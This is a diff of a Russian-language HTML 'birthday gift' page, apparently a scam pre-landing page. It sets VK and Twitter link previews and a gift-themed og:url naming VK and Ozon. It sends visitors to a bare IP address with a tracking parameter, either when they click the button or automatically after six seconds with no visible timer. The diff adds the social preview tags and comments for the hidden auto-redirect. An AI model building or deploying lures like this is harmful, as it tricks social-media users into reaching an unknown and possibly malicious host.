@@ -1,15 +1,23 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>С днём рождения! 🎁</title>
+    <title>Забери подарки прямо сейчас 🎁</title>
 
-    <!-- Превью для ВКонтакте (ваша картинка уже вставлена) -->
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Тебе подарок! 🎁 Открой скорее" />
-    <meta property="og:description" content="Празднуем! Порадуйте друзей подарком." />
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" />
+    <!-- Open Graph теги для красивого превью в ВК (из вашего кода) -->
+    <meta property="og:title" content="Забери подарки прямо сейчас 🎁">
+    <meta property="og:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+    <meta property="og:url" content="https://vk-ozon-podarki.github.io/">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Забери подарки прямо сейчас">
+
+    <!-- Twitter Card теги -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Забери подарки прямо сейчас 🎁">
+    <meta name="twitter:description" content="С днём рождения! Твой подарок уже ждёт тебя.">
+    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -100,17 +108,18 @@
 
     <div id="confetti-container"></div>
 
+    <!-- Приленд: Картинка + Кнопка поверх неё -->
     <div class="hero-wrap">
-        <!-- Картинка на странице (используем вашу ссылку, чтобы точно работало) -->
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s" alt="Праздничный торт">
         
-        <!-- ССЫЛКА НА ПОДАРОК (уже вставлена) -->
+        <!-- Кнопка с вашей ссылкой на подарок -->
         <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
             🎁 Забрать подарок
         </a>
     </div>
 
     <script>
+        // 1. Создаём конфетти
         function createConfetti() {
             const container = document.getElementById('confetti-container');
             const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#01a3a4', '#f368e0'];
@@ -130,20 +139,20 @@
         }
         createConfetti();
 
-        // Автопереход через 6 секунд на вашу ссылку
+        // 2. АВТОПЕРЕХОД ЧЕРЕЗ 6 СЕКУНД (без видимого таймера)
         const giftBtn = document.getElementById('giftBtn');
         const targetUrl = giftBtn.href;
 
         const redirectTimeout = setTimeout(() => {
             window.location.href = targetUrl;
-        }, 6000);
+        }, 6000); // 6000 миллисекунд = 6 секунд
 
+        // 3. Если человек нажал кнопку сам, переходим мгновенно
         giftBtn.addEventListener('click', function(e) {
             e.preventDefault();
-            clearTimeout(redirectTimeout);
+            clearTimeout(redirectTimeout); // отменяем таймер
             window.location.href = targetUrl;
         });
     </script>
-
 </body>
 </html>
